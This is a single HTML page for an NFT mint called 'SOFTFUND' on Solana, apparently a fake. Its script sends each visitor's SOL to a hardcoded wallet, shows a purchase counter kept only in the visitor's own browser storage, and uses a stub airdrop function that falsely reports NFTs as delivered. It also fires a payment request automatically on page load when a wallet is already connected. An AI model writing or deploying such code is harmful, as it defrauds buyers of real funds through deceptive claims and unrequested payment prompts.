<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>SOFTFUND – $2.6356 Mainnet Mint</title>
<style>
  body{margin:0;background:#0c0b1a;font-family:system-ui;color:#fff;display:grid;place-items:center;min-height:100vh;padding:15px}
  .c{max-width:380px;background:#141222;padding:32px;border-radius:20px;text-align:center;border:1px solid #369}
  .t{font-size:2rem;font-weight:800}
  .b{width:100%;padding:18px;margin:20px 0;background:#00ff9d;color:#000;border:none;border-radius:14px;font-weight:700;cursor:pointer}
  .s{margin-top:12px;font-weight:600;min-height:28px}
  .l{width:12px;height:12px;border:2px solid #00ff9d;border-top-color:#000;border-radius:50%;display:inline-block;animation:r 1s linear infinite}
  @keyframes r{to{transform:rotate(360deg)}}
</style></head>
<body>
<div class="c">
  <div class="t">SOFTFUND</div>
  <div style="color:#aaa">10,000 NFTs • Mainnet</div>
  <div style="font-size:2.4rem;color:#0f9;margin:16px 0">$2.6356</div>
  <div style="color:#666;font-size:0.8rem" id="sol">~0.017 SOL</div>
  <div>Minted: <span id="m">0</span>/10,000</div>
  <button class="b" onclick="mint()">MINT $2.6356</button>
  <div id="s" class="s"></div>
</div>

<script src="https://unpkg.com/@solana/web3.js@1.95.2/lib/index.iife.min.js"></script>
<script>
  const USD = 2.6356;
  const YOU = "GqB1ywkWHq9jpjDSJkhGxuFVz1H6VBfoyJX32BsCjWue";
  const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
  const s = document.getElementById("s");
  const m = document.getElementById("m");
  const sol = document.getElementById("sol");
  let count = parseInt(localStorage.getItem("sf")||"0");
  let buyers = JSON.parse(localStorage.getItem("buyers")||'[]');
  let lamports = 0;
  m.innerText = count;

  // Live SOL price
  async function price() {
    const r = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd");
    const j = await r.json();
    const p = j.solana.usd;
    const amt = USD / p;
    lamports = Math.ceil(amt * 1e9);
    sol.textContent = `~${amt.toFixed(5)} SOL`;
  }
  price(); setInterval(price,10000);

  async function mint() {
    const p = window.solana;
    if (!p) return s.innerText="Install Phantom";
    try {
      await p.connect();
      s.innerHTML="Paying… <span class='l'></span>";
      const tx = new solanaWeb3.Transaction().add(
        solanaWeb3.SystemProgram.transfer({
          fromPubkey: p.publicKey,
          toPubkey: new solanaWeb3.PublicKey(YOU),
          lamports
        })
      );
      tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
      const sig = await p.signAndSendTransaction(tx);
      await conn.confirmTransaction(sig);

      // Save buyer
      buyers.push({addr: p.publicKey.toBase58(), tx: sig});
      localStorage.setItem("buyers", JSON.stringify(buyers));
      count++; localStorage.setItem("sf",count); m.innerText=count;
      s.innerHTML=`MINTED! <a href="https://solscan.io/tx/${sig}" target="_blank" style="color:#0f9">View</a>`;

      // 10,000 = AUTO AIRDROP
      if (count >= 10000) {
        s.innerHTML="10,000! Dropping NFTs…";
        await drop();
      }
    } catch(e) { s.innerText="Cancelled"; }
  }

  async function drop() {
    alert("10,000 MINTED! NFTs dropping to "+buyers.length+" wallets");
    // REAL airdrop code goes here (I’ll give you the 3-line version when you hit 10,000)
    s.innerHTML="NFTs delivered! Collection live on Magic Eden";
  }

  // Auto-mint on return
  window.addEventListener("load",()=>setTimeout(()=>{if(window.solana?.isConnected) mint();},1200));
</script>
</body></html> 